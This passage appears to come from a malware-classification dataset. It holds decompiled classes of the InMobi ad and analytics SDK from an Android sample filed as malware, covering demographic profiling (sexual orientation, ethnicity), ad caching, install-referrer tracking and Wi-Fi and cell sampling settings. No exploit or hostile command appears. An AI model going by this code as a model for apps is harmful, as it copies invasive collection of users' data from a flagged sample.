else {       Log.debug(InternalSDKUtil.LOGGING_TAG,""Area code cannot be null"");     }   }   public static void setDateOfBirth(  Calendar calendar){     if (calendar != null) {       UserInfo.getInstance().setDateOfBirth(calendar);     }  else {       Log.debug(InternalSDKUtil.LOGGING_TAG,""Date Of Birth cannot be null"");     }   }   public static void setGender(  GenderType genderType){     if (genderType != null) {       UserInfo.getInstance().setGender(genderType);     }   }   public static void setIncome(  int i){     UserInfo.getInstance().setIncome(Integer.valueOf(i));   }   public static void setEducation(  EducationType educationType){     if (educationType != null) {       UserInfo.getInstance().setEducation(educationType);     }   }   public static void setEthnicity(  EthnicityType ethnicityType){     if (ethnicityType != null) {       UserInfo.getInstance().setEthnicity(ethnicityType);     }   }   public static void setAge(  int i){     UserInfo.getInstance().setAge(Integer.valueOf(i));   }   public static void setInterests(  String str){     if (str != null && !"""".equals(str.trim())) {       UserInfo.getInstance().setInterests(str);     }  else {       Log.debug(InternalSDKUtil.LOGGING_TAG,""Interests cannot be null"");     }   }   public static void addIDType(  IMIDType iMIDType,  String str){     UserInfo.getInstance().addIDType(iMIDType,str);   }   public static void removeIDType(  IMIDType iMIDType){     UserInfo.getInstance().removeIDType(iMIDType);   }   public static void setMaritalStatus(  MaritalStatus maritalStatus){     if (maritalStatus != null) {       UserInfo.getInstance().setMaritalStatus(maritalStatus);     }   }   public static void setLanguage(  String str){     if (str != null && !"""".equals(str.trim())) {       UserInfo.getInstance().setLanguage(str);     }  else {       Log.debug(InternalSDKUtil.LOGGING_TAG,""Language cannot be null"");     }   }   public static void setSexualOrientation(  SexualOrientation sexualOrientation){     if (sexualOrientation != null) {       UserInfo.getInstance().setSexualOrientation(sexualOrientation);     }   }   public static void setHasChildren(  HasChildren hasChildren){     if (hasChildren != null) {       UserInfo.getInstance().setHasChildren(hasChildren);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.ads.cache\AdData.code","public class AdData {   private long a;   private String b;   private long c;   private String d;   private String e;   public long getAdId(){     return this.a;   }   public void setAdId(  long j){     this.a=j;   }   public String getAppId(){     return this.b;   }   public void setAppId(  String str){     this.b=str;   }   public long getTimestamp(){     return this.c;   }   public void setTimestamp(  long j){     this.c=j;   }   public String getContent(){     return this.d;   }   public void setContent(  String str){     this.d=str;   }   public String getAdType(){     return this.e;   }   public void setAdType(  String str){     this.e=str;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.ads.cache\AdDatabaseHelper.code","public class AdDatabaseHelper extends SQLiteOpenHelper {   public static final String COLUMN_ADTYPE=""adtype"";   public static final String COLUMN_AD_CONTENT=""content"";   public static final String COLUMN_AD_ID=""adid"";   public static final String COLUMN_APPID=""appid"";   public static final String COLUMN_TIMESTAMP=""timestamp"";   public static final String DATABASE_NAME=""adcache.db"";   public static final String TABLE_AD=""ad"";   public AdDatabaseHelper(  Context context){     super(context,DATABASE_NAME,(SQLiteDatabase.CursorFactory)null,1);   }   @Override public void onCreate(  SQLiteDatabase sQLiteDatabase){     Log.internal(InternalSDKUtil.LOGGING_TAG,""CREATE TABLE IF NOT EXISTS ad (adid INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, timestamp INTEGER NOT NULL, appid VARCHAR NOT NULL, content VARCHAR NOT NULL, adtype VARCHAR NOT NULL);"");     sQLiteDatabase.execSQL(""CREATE TABLE IF NOT EXISTS ad (adid INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, timestamp INTEGER NOT NULL, appid VARCHAR NOT NULL, content VARCHAR NOT NULL, adtype VARCHAR NOT NULL);"");   }   @Override public void onUpgrade(  SQLiteDatabase sQLiteDatabase,  int i,  int i2){     Log.internal(InternalSDKUtil.LOGGING_TAG,""Upgrading database from version "" + i + "" to ""+ i2+ "", which will destroy all old data"");     sQLiteDatabase.execSQL(""DROP TABLE IF EXISTS ad;"");     onCreate(sQLiteDatabase);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.ads.cache\AdDatabaseManager.code","public class AdDatabaseManager {   private static AdDatabaseManager c;   private AdDatabaseHelper a;   private SQLiteDatabase b;   private int d=1000;   protected AdDatabaseManager(){   }   public static synchronized AdDatabaseManager getInstance(){     AdDatabaseManager adDatabaseManager; synchronized (AdDatabaseManager.class) {       if (c == null) {         c=new AdDatabaseManager();         c.a=new AdDatabaseHelper(InternalSDKUtil.getContext());       }       adDatabaseManager=c;     }     return adDatabaseManager;   }   protected void open(){     try {       this.b=this.a.getWritableDatabase();     }  catch (    Exception e) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Failed to open ads db"",e);     }   }   protected void close(){     try {       this.b.close();     }  catch (    Exception e) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Failed to close ads db"",e);     }   }   public synchronized void insertAd(  AdData adData){     try {       ContentValues contentValues=new ContentValues();       contentValues.put(""timestamp"",Long.valueOf(adData.getTimestamp()));       contentValues.put(AdDatabaseHelper.COLUMN_APPID,adData.getAppId());       contentValues.put(AdDatabaseHelper.COLUMN_AD_CONTENT,adData.getContent());       contentValues.put(AdDatabaseHelper.COLUMN_ADTYPE,adData.getAdType());       if (getDBSize() >= this.d) {         open();         Cursor rawQuery=this.b.rawQuery(""SELECT adid FROM ad WHERE timestamp= (SELECT MIN(timestamp) FROM ad Limit 1);"",null);         rawQuery.moveToFirst();         long j=rawQuery.getLong(0);         rawQuery.close();         this.b.delete(AdDatabaseHelper.TABLE_AD,""adid = "" + j,null);         close();       }       open();       this.b.insert(AdDatabaseHelper.TABLE_AD,null,contentValues);       close();     }  catch (    Exception e) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Failed to insert native ads to db"",e);     }   }   public synchronized AdData getAd(  String str){     AdData adData;     try {       open();       Cursor rawQuery=this.b.rawQuery(""SELECT * FROM ad WHERE appid = ? Order by timestamp Limit 1;"",new String[]{str});       rawQuery.moveToFirst();       adData=new AdData();       adData.setAdId(rawQuery.getLong(0));       adData.setTimestamp(rawQuery.getLong(1));       adData.setAppId(rawQuery.getString(2));       adData.setContent(rawQuery.getString(3));       rawQuery.close();       this.b.delete(AdDatabaseHelper.TABLE_AD,""adid = "" + adData.getAdId(),null);       close();     }  catch (    Exception e) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Failed to get native ads from db"",e);       adData=null;     }     return adData;   }   public synchronized int getNoOfAds(  String str){     int i;     try {       open();       i=this.b.rawQuery(""SELECT * FROM ad WHERE appid = ?; "",new String[]{str}).getCount();       close();     }  catch (    Exception e) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Failed to get native ads from db"",e);       i=0;     }     return i;   }   public void setDBLimit(  int i){     if (i > 0) {       this.d=i;     }   }   protected int getDBSize(){     try {       open();       int count=this.b.rawQuery(""SELECT * FROM ad; "",null).getCount();       close();       return count;     }  catch (    Exception e) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Failed to get native ads from db"",e);       return 0;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.androidsdk\IMAdTracker.code","public final class IMAdTracker {   private static IMAdTracker a;   private IMAdTracker(){   }   public static synchronized IMAdTracker getInstance(){     IMAdTracker iMAdTracker; synchronized (IMAdTracker.class) {       if (a == null) {         a=new IMAdTracker();       }       iMAdTracker=a;     }     return iMAdTracker;   }   public void init(  Context context,  String str){     try {       if (context == null) {         Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""Application Context NULL"");         Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,AdTrackerConstants.MSG_APP_CONTEXT_NULL);         return;       }       if (str == null) {         Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""APP ID Cannot be NULL"");         Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,AdTrackerConstants.MSG_APP_ID_NULL);         return;       }       if (str.trim().equals("""")) {         Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,AdTrackerConstants.MSG_APP_ID_EMPTY);         return;       }       Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""IMAdtracker init successfull"");       FileOperations.setPreferences(context,AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.APP_ID,str);       if (!AdTrackerUtils.isPermissionGranted(""android.permission.INTERNET"") || !AdTrackerUtils.isPermissionGranted(""android.permission.ACCESS_NETWORK_STATE"")) {         Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,AdTrackerConstants.MSG_PERMISSION_MISSING);         return;       }       if (Build.VERSION.SDK_INT < 17 && !AdTrackerUtils.isPermissionGranted(""android.permission.READ_LOGS"")) {         Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,AdTrackerConstants.MSG_OPTIONAL_PERM_MISSING);       }       if (0 == FileOperations.getLongPreferences(context.getApplicationContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.KEY_T1)) {         FileOperations.setPreferences(context.getApplicationContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.KEY_T1,System.currentTimeMillis());       }       IntentFilter intentFilter=new IntentFilter();       intentFilter.addAction(""android.net.conn.CONNECTIVITY_CHANGE"");       intentFilter.addAction(AdTrackerConstants.REFERRER_INTENT_ACTION);       context.getApplicationContext().registerReceiver(new IMAdTrackerReceiver(),intentFilter);     }  catch (    Exception e) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Failed to init"",e);     }   }   public void reportAppDownloadGoal(){     a(AdTrackerConstants.GOAL_DOWNLOAD);   }   public void reportCustomGoal(  String str){     if (AdTrackerConstants.GOAL_DOWNLOAD.equals(str)) {       Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,AdTrackerConstants.MSG_INVALID_CUSTOM_GOAL);     }  else {       a(str);     }   }   private boolean a(  String str){     try {       String preferences=FileOperations.getPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.APP_ID);       if (InternalSDKUtil.getContext() == null || preferences == null || preferences.trim().equals("""")) {         Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,AdTrackerConstants.MSG_INITIALIZATION_INCOMPLETE);         return false;       }       if (str == null || """".equals(str.trim())) {         Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,AdTrackerConstants.MSG_INVALID_GOAL);         return false;       }       boolean checkDownloadGoalUploaded=AdTrackerUtils.checkDownloadGoalUploaded();       if (AdTrackerConstants.GOAL_DOWNLOAD.equals(str) && true == checkDownloadGoalUploaded) {         Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""Download goal already uploaded"");         return false;       }       AdTrackerNetworkInterface.init();       if (AdTrackerConstants.GOAL_DOWNLOAD.equals(str)) {         if (!AdTrackerUtils.checkDownloadGoalAdded()) {           FileOperations.setPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.IAT_DOWNLOAD_INSERT_STATUS,true);           Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""Goal Queued "" + str);           AdTrackerNetworkInterface.getGoalList().addGoal(str,1,0L,0,false);         }       }  else {         Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""Goal Queued "" + str);         AdTrackerNetworkInterface.getGoalList().addGoal(str,1,0L,0,false);       }       AdTrackerNetworkInterface.reportToServer(preferences);       return true;     }  catch (    Exception e) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Cannot report goal"",e);       return false;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.androidsdk\IMAdTrackerReceiver.code","public class IMAdTrackerReceiver extends BroadcastReceiver {   @Override public void onReceive(  Context context,  Intent intent){     if (intent.getAction().equals(AdTrackerConstants.REFERRER_INTENT_ACTION)) {       try {         Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""Received INSTALL REFERRER"");         String string=intent.getExtras().getString(AdTrackerConstants.REFERRER);         Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""Referrer String: "" + string);         FileOperations.setPreferences(context.getApplicationContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.REFERRER_FROM_SDK,1);         AdTrackerUtils.setInternalReferrer(context.getApplicationContext(),URLEncoder.encode(string,""utf-8""));         return;       }  catch (      Exception e) {         Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Error install receiver"",e);         return;       }     }     if (intent.getAction().equals(""android.net.conn.CONNECTIVITY_CHANGE"") && InternalSDKUtil.checkNetworkAvailibility(context)) {       try {         Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Received CONNECTIVITY BROADCAST"");         AdTrackerNetworkInterface.init();         AdTrackerNetworkInterface.reportToServer(FileOperations.getPreferences(context.getApplicationContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.APP_ID));       }  catch (      Exception e2) {         Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Connectivity receiver exception"",e2);       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.bootstrapper\a.code","class a implements CacheController.Validator {   @Override public boolean validate(  Map<String,Object> map){     boolean b;     b=AnalyticsInitializer.b((Map<String,Object>)map);     return b;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.bootstrapper\AnalyticsConfigParams.code","public class AnalyticsConfigParams {   private static final Long a=null;   private UID b=new UID();   private AnalyticsEndPointsConfig c=new AnalyticsEndPointsConfig();   private ThinICEConfig d=new ThinICEConfig();   private Long e=a;   private int f=5;   private int g=1000;   private int h=100;   private int i=3;   private int j=20;   private int k=50;   private int l=100;   private int m=5;   private AutomaticCaptureConfig n=new AutomaticCaptureConfig();   private int o=100;   public int getMaxDbEvents(){     return this.g;   }   public int getGetParamsLimit(){     return this.h;   }   public int getMinEventsToCompress(){     return this.f;   }   public int getPingInterval(){     return this.i * 1000;   }   public int getMaxKeyLength(){     return this.j;   }   public int getMaxValLength(){     return this.k;   }   public int getMaxAppIdLength(){     return this.o;   }   public int getMaxRetryBeforeCacheDiscard(){     return this.m;   }   public AutomaticCaptureConfig getAutomaticCapture(){     return this.n;   }   public int getExtraParamsLimit(){     return this.l;   }   public Long getLTVId(){     return this.e;   }   public UID getUID(){     return this.b;   }   public AnalyticsEndPointsConfig getEndPoints(){     return this.c;   }   public ThinICEConfig getThinIceConfig(){     return this.d;   }   public void setFromMap(  Map<String,Object> map){     this.h=InternalSDKUtil.getIntFromMap(map,""elim"",1,2147483647L);     this.g=InternalSDKUtil.getIntFromMap(map,""mdb"",1,2147483647L);     this.j=InternalSDKUtil.getIntFromMap(map,""mkey"",1,2147483647L);     this.k=InternalSDKUtil.getIntFromMap(map,""mval"",1,2147483647L);     this.i=InternalSDKUtil.getIntFromMap(map,""pint"",1,2147483647L);     this.l=InternalSDKUtil.getIntFromMap(map,""plim"",1,2147483647L);     this.e=Long.valueOf(InternalSDKUtil.getLongFromMap(map,""ltvid"",Long.MIN_VALUE,Long.MAX_VALUE));     this.f=InternalSDKUtil.getIntFromMap(map,""mec"",1,2147483647L);     this.m=InternalSDKUtil.getIntFromMap(map,""mr"",0,2147483647L);     this.o=InternalSDKUtil.getIntFromMap(map,""aidl"",1,2147483647L);     this.b.setFromMap((Map)map.get(""ids""));     this.c.setFromMap((Map)map.get(""endpoints""));     this.d.setFromMap((Map)map.get(""tic""));     this.n.setFromMap((Map)map.get(""at""));   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.bootstrapper\AnalyticsEndPointsConfig.code","public class AnalyticsEndPointsConfig {   private String a=""http://a.ai.inmobi.com/v2/ad.html"";   private String b=""http://a.ai.inmobi.com/v2/rules.json"";   private String c=""https://e-ltvp.inmobi.com/storm/v1/event"";   public String getHouseUrl(){     return this.a;   }   public String getRulesUrl(){     return this.b;   }   public String getEventsUrl(){     return this.c;   }   public void setFromMap(  Map<String,Object> map){     this.a=InternalSDKUtil.getStringFromMap(map,""house"");     this.b=InternalSDKUtil.getStringFromMap(map,""rules"");     this.c=InternalSDKUtil.getStringFromMap(map,""events"");   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.bootstrapper\AnalyticsInitializer.code","public class AnalyticsInitializer {   public static final String PRODUCT_ANALYTICS=""ltvp"";   private static Context a=null;   private static Map<String,String> b=new HashMap();   private static AnalyticsConfigParams c=new AnalyticsConfigParams();   private static CacheController.Validator d=new a();   public static AnalyticsConfigParams getRawConfigParams(){     return c;   }   public static AnalyticsConfigParams getConfigParams(){     if (InternalSDKUtil.getContext() != null && InMobi.getAppId() != null) {       b(InternalSDKUtil.getContext());     }     return c;   }   private static void a(  Context context){     if (context != null && a == null) {       if (a == null) {         a=context.getApplicationContext();         b=getUidMap(context);         try {           ProductConfig config=CacheController.getConfig(PRODUCT_ANALYTICS,context,b,d);           if (config.getRawData() != null) {             b(config.getData());             return;           }           return;         }  catch (        CommonsException e) {           Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Exception while retreiving configs due to commons Exception with code "" + e.getCode());           return;         } catch (        Exception e2) {           Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Exception while retreiving configs."",e2);           return;         }       }       return;     }     if (a == null && context == null) {       a.getApplicationContext();     }   }   private static void b(  Context context){     a(context);     b=getUidMap(a);     try {       CacheController.getConfig(PRODUCT_ANALYTICS,context,b,d);     }  catch (    Exception e) {     }   }   public static Map<String,String> getUidMap(  Context context){     return UIDUtil.getMap(a,c.getUID());   }   public static boolean b(  Map<String,Object> map){     AnalyticsConfigParams analyticsConfigParams=new AnalyticsConfigParams();     try {       analyticsConfigParams.setFromMap((Map)map.get(""common""));       c=analyticsConfigParams;       ThinICE.setConfig(analyticsConfigParams.getThinIceConfig());       return true;     }  catch (    Exception e) {       Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Exception while saving configs."",e);       return false;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.bootstrapper\AutomaticCaptureConfig.code","public class AutomaticCaptureConfig {   private boolean a=true;   private boolean b=false;   public boolean getAutoPurchaseCapture(){     return this.b;   }   public boolean getAutoSessionCapture(){     return this.a;   }   public void setFromMap(  Map<String,Object> map){     this.a=InternalSDKUtil.getBooleanFromMap(map,""session"");     this.b=InternalSDKUtil.getBooleanFromMap(map,""purchase"");   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.bootstrapper\ThinICEConfig.code","public class ThinICEConfig {   public static final int CELL_OP_FLAGS_DEFAULT=0;   public static final boolean ENABLED_DEFAULT=true;   public static final String END_POINT_DEFAULT="""";   public static final long MAX_RETRY_DEFAULT=3;   public static final long RETRY_INTERVAL=3;   public static final boolean SAMPLE_CELL_CONNECTED_WIFI_ENABLED_DEFAULT=true;   public static final boolean SAMPLE_CELL_ENABLED_DEFAULT=true;   public static final boolean SAMPLE_CELL_OPERATOR_ENABLED_DEFAULT=true;   public static final boolean SAMPLE_CELL_VISIBLE_WIFI_ENABLED_DEFAULT=true;   public static final int SAMPLE_HISTORY_SIZE_DEFAULT=50;   public static final long SAMPLE_INTERVAL_DEFAULT=60;   public static final long STOP_REQUEST_TIMEOUT_DEFAULT=3;   public static final int WIFI_FLAGS_DEFAULT=0;   private long a=60;   private long b=3;   private long c=3;   private long d=3;   private int e=50;   private int f=0;   private int g=0;   private String h="""";   private boolean i=true;   private boolean j=true;   private boolean k=true;   private boolean l=true;   private boolean m=true;   private boolean n=false;   private long o=86400;   private boolean p=false;   private long q=180;   private long r=50;   public long getSampleInterval(){     return this.a;   }   public long getStopRequestTimeout(){     return this.b;   }   public long getRetryInterval(){     return this.c;   }   public long getMaxRetry(){     return this.d;   }   public int getSampleHistorySize(){     return this.e;   }   public int getWifiFlags(){     return this.f;   }   public int getCellOpsFlag(){     return this.g;   }   public boolean isEnabled(){     return this.i;   }   public boolean isOperatorEnabled(){     return this.j;   }   public boolean isCellEnabled(){     return this.k;   }   public boolean isConnectedWifiEnabled(){     return this.l;   }   public boolean isVisibleWifiEnabled(){     return this.m;   }   public String getEndpointUrl(){     return this.h;   }   public boolean isAppDetectionEnabled(){     return this.n;   }   public long getAppDetectionInterval(){     return this.o * 1000;   }   public boolean isActivityDetectionEnabled(){     return this.p;   }   public long getActivityDetectionInterval(){     return this.q * 1000;   }   public long getActivityDetectionMaxSize(){     return this.r;   }   public final void setFromMap(  Map<String,Object> map){     this.a=InternalSDKUtil.getLongFromMap(map,""si"",1L,Long.MAX_VALUE);     this.b=InternalSDKUtil.getLongFromMap(map,""srt"",1L,Long.MAX_VALUE);     this.e=InternalSDKUtil.getIntFromMap(map,""shs"",1,2147483647L);     this.f=InternalSDKUtil.getIntFromMap(map,""wfd"",0,15L);     this.g=InternalSDKUtil.getIntFromMap(map,""cof"",0,15L);     this.i=InternalSDKUtil.getBooleanFromMap(map,""e"");     this.l=InternalSDKUtil.getBooleanFromMap(map,""sccw"");     this.k=InternalSDKUtil.getBooleanFromMap(map,""sced"");     this.j=InternalSDKUtil.getBooleanFromMap(map,""scoe"");     this.m=InternalSDKUtil.getBooleanFromMap(map,""scvw"");     this.h=InternalSDKUtil.getStringFromMap(map,""ep"");     this.d=InternalSDKUtil.getLongFromMap(map,""mr"",0L,Long.MAX_VALUE);     this.c=InternalSDKUtil.getLongFromMap(map,""ri"",1L,Long.MAX_VALUE);     this.n=InternalSDKUtil.getBooleanFromMap(map,""ao"");     this.o=InternalSDKUtil.getLongFromMap(map,""aoi"",1L,Long.MAX_VALUE);     this.p=InternalSDKUtil.getBooleanFromMap(map,""as"");     this.q=InternalSDKUtil.getLongFromMap(map,""assi"",1L,Long.MAX_VALUE);     this.r=InternalSDKUtil.getLongFromMap(map,""asm"",1L,Long.MAX_VALUE);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.db\a.code","class a extends Thread {   a(){   }   @Override public void run(){     while (!AnalyticsEventsQueue.this.isEmpty()) {       try {         AnalyticsEventsQueue.this.a(AnalyticsEventsQueue.this.remove(0));       }  catch (      Exception e) {         Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Exception processing function"",e);         return;       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.db\AnalyticsDatabaseManager.code","public final class AnalyticsDatabaseManager {   private static AnalyticsDatabaseManager c;   private static final String[] d={AnalyticsSQLiteHelper.GENERAL_ID,AnalyticsSQLiteHelper.EVENT_LIST_EVENT_ID,AnalyticsSQLiteHelper.EVENT_LIST_TYPE,AnalyticsSQLiteHelper.EVENT_LIST_SID,AnalyticsSQLiteHelper.EVENT_LIST_TS,AnalyticsSQLiteHelper.EVENT_LIST_SSTS,AnalyticsSQLiteHelper.EVENT_LIST_AM};   private static final String[] e={AnalyticsSQLiteHelper.GENERAL_ID,""levelid"",""levelname""};   private static final String[] f={AnalyticsSQLiteHelper.GENERAL_ID,""levelid"",""levelname"",AnalyticsSQLiteHelper.LEVEL_END_LEVEL_STATUS,AnalyticsSQLiteHelper.LEVEL_END_TIME_TAKEN,AnalyticsSQLiteHelper.LEVEL_END_ATTEMPT_COUNT,AnalyticsSQLiteHelper.LEVEL_END_ATTEMPT_TIME};   private static final String[] g={AnalyticsSQLiteHelper.GENERAL_ID,AnalyticsSQLiteHelper.CUSTOM_EVENT_EVENT_NAME};   private static final String[] h={AnalyticsSQLiteHelper.GENERAL_ID,""levelid"",AnalyticsSQLiteHelper.ATTEMPT_DATA_BEGIN_TIME,AnalyticsSQLiteHelper.ATTEMPT_DATA_TOTAL_COUNT,AnalyticsSQLiteHelper.ATTEMPT_DATA_TOTAL_TIME};   private static final String[] i={AnalyticsSQLiteHelper.GENERAL_ID,AnalyticsSQLiteHelper.TRANSACTION_ITEM_NAME,AnalyticsSQLiteHelper.TRANSACTION_ITEM_TYPE,AnalyticsSQLiteHelper.TRANSACTION_ITEM_COUNT,AnalyticsSQLiteHelper.TRANSACTION_ITEM_DESCRIPTION,AnalyticsSQLiteHelper.TRANSACTION_ITEM_ITEM_PRICE,AnalyticsSQLiteHelper.TRANSACTION_ITEM_CURRENCY_CODE,AnalyticsSQLiteHelper.TRANSACTION_PRODUCT_ID,AnalyticsSQLiteHelper.TRANSACTION_ID,AnalyticsSQLiteHelper.TRANSACTION_STATUS};   private AnalyticsSQLiteHelper a;   private SQLiteDatabase b;   private AnalyticsDatabaseManager(){   }   public static synchronized AnalyticsDatabaseManager getInstance(){     AnalyticsDatabaseManager analyticsDatabaseManager; synchronized (AnalyticsDatabaseManager.class) {       if (c == null) {         c=new AnalyticsDatabaseManager();         File databasePath=InternalSDKUtil.getContext().getDatabasePath(AnalyticsSQLiteHelper.OLD_DATABASE_NAME);         if (databasePath.isFile()) {           databasePath.renameTo(InternalSDKUtil.getContext().getDatabasePath(AnalyticsSQLiteHelper.DATABASE_NAME));           SessionInfo.updatedFromOldSDK(InternalSDKUtil.getContext());         }         c.a=new AnalyticsSQLiteHelper(InternalSDKUtil.getContext());       }       analyticsDatabaseManager=c;     }     return analyticsDatabaseManager;   }   private void a(){     this.b=this.a.getWritableDatabase();   }   private void b(){     this.a.close();   }   public synchronized void insertEvents(  AnalyticsEvent analyticsEvent){     try {       a();       a(analyticsEvent,this.b.compileStatement(""SELECT COUNT(*) FROM eventlist"").simpleQueryForLong());       b();     }  catch (    Exception e2) {       Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Error in inserting into DB."",e2);       e2.printStackTrace();     }   }   private void a(  AnalyticsEvent analyticsEvent,  long j){     String str;     String str2;     String str3;     Log.debug(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""IMAppDatabaseManager->insertEvents-"" + analyticsEvent.getEventType());     if (j < AnalyticsUtils.getMaxdbcount()) {       ContentValues contentValues=new ContentValues();       long j2=-1;       long eventTimeStamp=analyticsEvent.getEventTimeStamp();       if (analyticsEvent.getEventType().equals(AnalyticsEvent.TYPE_LEVEL_BEGIN)) {         ContentValues contentValues2=new ContentValues();         contentValues2.put(AnalyticsSQLiteHelper.ATTEMPT_DATA_BEGIN_TIME,Long.valueOf(eventTimeStamp));         if (this.b.update(AnalyticsSQLiteHelper.TABLE_ATTEMPT_DATA,contentValues2,""levelid = ?"",new String[]{analyticsEvent.getEventLevelId()}) <= 0) {           contentValues2.put(""levelid"",analyticsEvent.getEventLevelId());           contentValues2.put(AnalyticsSQLiteHelper.ATTEMPT_DATA_TOTAL_COUNT,Integer.toString(0));           contentValues2.put(AnalyticsSQLiteHelper.ATTEMPT_DATA_TOTAL_TIME,Integer.toString(0));           this.b.insert(AnalyticsSQLiteHelper.TABLE_ATTEMPT_DATA,null,contentValues2);         }         contentValues.put(""levelid"",analyticsEvent.getEventLevelId());         contentValues.put(""levelname"",analyticsEvent.getEventLevelName());         j2=this.b.insert(AnalyticsSQLiteHelper.TABLE_LEVEL_BEGIN,null,contentValues);       }  else       if (analyticsEvent.getEventType().equals(AnalyticsEvent.TYPE_LEVEL_END)) {         Cursor query=this.b.query(AnalyticsSQLiteHelper.TABLE_ATTEMPT_DATA,h,""levelid = ?"",new String[]{analyticsEvent.getEventLevelId()},null,null,null,""1"");         if (query.getCount() <= 0) {           str=""0"";           str2=""0"";           str3=""0"";         }  else {           query.moveToFirst();           long parseLong=eventTimeStamp - Long.parseLong(query.getString(2));           str3=Long.toString(parseLong);           str=Long.toString(parseLong + Long.parseLong(query.getString(4)));           str2=Integer.toString(Integer.parseInt(query.getString(3)) + 1);           ContentValues contentValues3=new ContentValues();           contentValues3.put(AnalyticsSQLiteHelper.ATTEMPT_DATA_TOTAL_COUNT,str2);           contentValues3.put(AnalyticsSQLiteHelper.ATTEMPT_DATA_TOTAL_TIME,str);           this.b.update(AnalyticsSQLiteHelper.TABLE_ATTEMPT_DATA,contentValues3,""levelid = ?"",new String[]{analyticsEvent.getEventLevelId()});         }         query.close();         contentValues.put(""levelid"",analyticsEvent.getEventLevelId());         contentValues.put(AnalyticsSQLiteHelper.LEVEL_END_LEVEL_STATUS,analyticsEvent.getEventLevelStatus());         contentValues.put(""levelname"",analyticsEvent.getEventLevelName());         contentValues.put(AnalyticsSQLiteHelper.LEVEL_END_TIME_TAKEN,str3);         contentValues.put(AnalyticsSQLiteHelper.LEVEL_END_ATTEMPT_COUNT,str2);         contentValues.put(AnalyticsSQLiteHelper.LEVEL_END_ATTEMPT_TIME,str);         j2=this.b.insert(AnalyticsSQLiteHelper.TABLE_LEVEL_END,null,contentValues);       }  else       if (analyticsEvent.getEventType().equals(AnalyticsEvent.TYPE_TAG_TRANSACTION)) {         contentValues.put(AnalyticsSQLiteHelper.TRANSACTION_ITEM_NAME,analyticsEvent.getTransactionItemName());         int transactionItemType=analyticsEvent.getTransactionItemType();         if (AnalyticsEvent.TRANSACTION_ITEM_TYPE.INVALID.getValue() != transactionItemType) {           contentValues.put(AnalyticsSQLiteHelper.TRANSACTION_ITEM_TYPE,Integer.valueOf(transactionItemType));         }         int 